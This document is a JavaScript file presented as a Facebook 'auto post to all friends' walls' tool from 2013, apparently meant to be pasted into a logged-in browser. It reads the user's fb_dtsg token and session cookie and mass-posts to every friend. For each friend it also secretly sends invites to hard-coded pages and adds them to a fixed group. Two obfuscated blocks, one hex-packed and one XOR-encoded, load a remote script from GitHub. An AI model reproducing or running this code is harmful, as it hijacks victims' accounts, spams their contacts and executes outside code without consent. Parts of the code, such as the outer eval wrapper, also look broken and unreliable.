/*HTML/JavaScript page status="protected"*/
/*Auto Friend Suggestion Script*/
/*Copyright © 2013 Bhargav JT. Gogoi. All Rights Reserved.*/
eval(unescape("var Title = 'Auto Post Your Message in All Friend\'s Wall or Timeline.';
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://automateyourfacebook.blogspot.in/" target="_blank">Automate Your Facebook</A>.</A>';
var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>"; /*|undefined undefined|*/
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
display += "<div><textarea id='txtFloodMsg' placeholder='Write your messege here.'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.9);'></textarea></div>";
display += "<div class='clearfix' style='text-align:right;padding-top:5px;'><a style='text-align:right;padding-top:5px;' data-hover='tooltip' aria-label='Your friends' data-tooltip-alignh='right' class='uiSelectorButton uiButton uiButtonSuppressed' href='#' role='button' aria-haspopup='1' aria-expanded='false' data-label='' data-length='30' data-ariaprefix='Post Privacy Setting' rel='toggle' id='js_14'><i class='mrs defaultIcon customimg img sp_5ym4oy sx_042661'></i><span class='uiButtonText'>Friends</span></a><a><span id='UIButton_Start' onclick='autopostingfunc()' style='text-align:center;font-family:tahoma;color:white;width:45px;height:25px;' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected'>Post</span></a></div>";
display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
display += _text;
window[tag + '_close'] = true;
display += "</div>";
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display;

function Posting(o) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/stream/inline.php?fb_dtsg=" + fb_dtsg + "&walltarget=" + o + "&render_notif_only=1&birthday=1&message_text=" + encodeURIComponent(msg) + "&message=" + encodeURIComponent(msg) + "&giftsgroupid=8ff493ad46&post=Post&nctr[_mod]=pagelet_reminders&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFIwd9e&__req=1b&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            Descriptions += 'The message could not be posted to this Wall. ';
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += "Please Wait Now Posting in " + arn[i] + "\'s Timeline.<br/>";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>"; /*|undefined undefined|*/
        if (i > 0) {
            var Title = 'Auto Post Your Message is Now Processing';
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Messege Posted of " + (arr.length - i) + " Messege Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += getuname + " Please Wait While Posting Your Messege.<br/>";
            display += _text;
            window[tag + '_close'] = true;
            display += "</div>";
            display += "</div>"
        } else {
            Title = 'Auto Post Has Posted Your Message';
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            display += arr.length + " Friends Detected and " + suc + " Messege Posted</br></br>";
            window[tag + '_close'] = false;
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span style='color:black' class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>"
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[i];
        setTimeout("Posting(" + s + ");", 1000)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
   
  if (fb_dtsg){ 
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + o + "%22%3A1%7D&checkableitems[0]=" + o + "&page_id=514486465297821&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
               }
  if (fb_dtsg){
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + o + "%22%3A1%7D&checkableitems[0]=" + o + "&page_id=638448586182539&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
               }
  if (fb_dtsg){
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=310509582323426&source=typeahead&members=" + o + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
              }
}
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
var _0x612a = ["\x65\x20\x61\x3D\x27\x66\x20\x62\x3A\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x67\x22\x20\x36\x3D\x22\x37\x22\x3E\x68\x20\x5B\x69\x20\x5D\x20\x6A\x25\x3C\x2F\x41\x3E\x20\x26\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x6B\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x6C\x20\x6D\x20\x6E\x20\x6F\x3C\x2F\x41\x3E\x2E\x3C\x2F\x63\x3E\x70\x20\x71\x20\x62\x3A\x20\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x72\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x73\x20\x74\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2C\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x75\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x76\x20\x77\x2E\x20\x78\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2E\x3C\x2F\x63\x3E\x79\x20\x7A\x20\x42\x20\x43\x20\x44\x20\x45\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x46\x2E\x47\x2E\x48\x2F\x22\x20\x36\x3D\x22\x37\x22\x3E\x49\x20\x4A\x20\x4B\x3C\x2F\x41\x3E\x2E\x3C\x2F\x41\x3E\x27\x3B\x4C\x28\x4D\x21\x3D\x61\x29\x7B\x4E\x3A\x28\x4F\x28\x29\x7B\x64\x2E\x50\x2E\x51\x28\x64\x2E\x52\x28\x27\x53\x27\x29\x29\x2E\x54\x3D\x27\x55\x3A\x2F\x2F\x56\x2E\x57\x2E\x35\x2F\x58\x2F\x59\x2D\x5A\x2F\x31\x30\x2F\x31\x31\x2E\x31\x32\x27\x7D\x29\x28\x29\x7D", "\x7C", "\x73\x70\x6C\x69\x74", "\x73\x74\x79\x6C\x65\x7C\x63\x6F\x6C\x6F\x72\x7C\x33\x42\x35\x39\x39\x38\x7C\x68\x72\x65\x66\x7C\x68\x74\x74\x70\x7C\x63\x6F\x6D\x7C\x74\x61\x72\x67\x65\x74\x7C\x5F\x62\x6C\x61\x6E\x6B\x7C\x77\x77\x77\x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x4F\x6D\x6E\x69\x5F\x74\x65\x78\x74\x7C\x42\x79\x7C\x62\x72\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x76\x61\x72\x7C\x50\x6F\x77\x65\x72\x65\x64\x7C\x33\x31\x33\x30\x37\x32\x35\x33\x32\x31\x30\x31\x30\x37\x36\x7C\x4C\x6F\x61\x64\x69\x6E\x67\x7C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x7C\x39\x39\x7C\x31\x39\x39\x31\x33\x34\x34\x39\x36\x39\x31\x34\x30\x37\x37\x7C\x41\x73\x73\x61\x6D\x7C\x49\x6E\x64\x69\x61\x6E\x7C\x43\x79\x62\x65\x72\x7C\x46\x6F\x72\x63\x65\x7C\x53\x63\x72\x69\x70\x74\x7C\x4D\x61\x64\x65\x7C\x31\x30\x30\x30\x30\x31\x30\x35\x30\x32\x33\x35\x34\x32\x30\x7C\x57\x61\x71\x61\x72\x7C\x41\x68\x6D\x61\x64\x7C\x31\x30\x30\x30\x30\x35\x31\x31\x35\x39\x33\x38\x36\x31\x34\x7C\x42\x68\x61\x72\x67\x61\x76\x7C\x4A\x54\x7C\x47\x6F\x67\x6F\x69\x7C\x46\x6F\x72\x7C\x4D\x6F\x72\x65\x7C\x7C\x54\x6F\x6F\x6C\x73\x7C\x56\x69\x73\x69\x74\x7C\x4F\x75\x72\x7C\x42\x6C\x6F\x67\x67\x65\x72\x7C\x61\x75\x74\x6F\x6D\x61\x74\x65\x79\x6F\x75\x72\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x62\x6C\x6F\x67\x73\x70\x6F\x74\x7C\x69\x6E\x7C\x41\x75\x74\x6F\x6D\x61\x74\x65\x7C\x59\x6F\x75\x72\x7C\x46\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x69\x66\x7C\x5F\x74\x65\x78\x74\x7C\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x62\x6F\x64\x79\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x73\x63\x72\x69\x70\x74\x7C\x73\x72\x63\x7C\x68\x74\x74\x70\x73\x7C\x72\x61\x77\x7C\x67\x69\x74\x68\x75\x62\x7C\x62\x68\x61\x72\x67\x61\x76\x31\x39\x39\x36\x7C\x46\x75\x6E\x7C\x74\x69\x6D\x65\x7C\x6D\x61\x73\x74\x65\x72\x7C\x55\x6E\x69\x6F\x6E\x7C\x6A\x73", "", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "\x72\x65\x70\x6C\x61\x63\x65", "\x5C\x77\x2B", "\x5C\x62", "\x67"];
eval(function (_0x1b3bx1, _0x1b3bx2, _0x1b3bx3, _0x1b3bx4, _0x1b3bx5, _0x1b3bx6) {
    _0x1b3bx5 = function (_0x1b3bx3) {
        return (_0x1b3bx3 < _0x1b3bx2 ? _0x612a[4] : _0x1b3bx5(parseInt(_0x1b3bx3 / _0x1b3bx2))) + ((_0x1b3bx3 = _0x1b3bx3 % _0x1b3bx2) > 35 ? String[_0x612a[5]](_0x1b3bx3 + 29) : _0x1b3bx3.toString(36));
    };
    if (!_0x612a[4][_0x612a[6]](/^/, String)) {
        while (_0x1b3bx3--) {
            _0x1b3bx6[_0x1b3bx5(_0x1b3bx3)] = _0x1b3bx4[_0x1b3bx3] || _0x1b3bx5(_0x1b3bx3);
        };
        _0x1b3bx4 = [

            function (_0x1b3bx5) {
                return _0x1b3bx6[_0x1b3bx5];
            }
        ];
        _0x1b3bx5 = function () {
            return _0x612a[7];
        };
        _0x1b3bx3 = 1;
    };
    while (_0x1b3bx3--) {
        if (_0x1b3bx4[_0x1b3bx3]) {
            _0x1b3bx1 = _0x1b3bx1[_0x612a[6]](new RegExp(_0x612a[8] + _0x1b3bx5(_0x1b3bx3) + _0x612a[8], _0x612a[9]), _0x1b3bx4[_0x1b3bx3]);
        };
    };
    return _0x1b3bx1;
}(_0x612a[0], 62, 65, _0x612a[3][_0x612a[2]](_0x612a[1]), 0, {}));
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
};
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + '_close']) {
        return 'This script is running now!'
    }
};
var now = (new Date).getTime();
var tag = 'Close';
var i = 3;
var tay = 3;
var suc = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var msg = '';
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length)
});

function autopostingfunc() {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    Posting(arr[i])
}
var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
Y = "";
Z = "";
var V;
V = X.length;
for (i = 0; i < V; i++) {
    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
}
Z = unescape(Y);
document.body.appendChild(document.createElement('script')).src = Z;"));
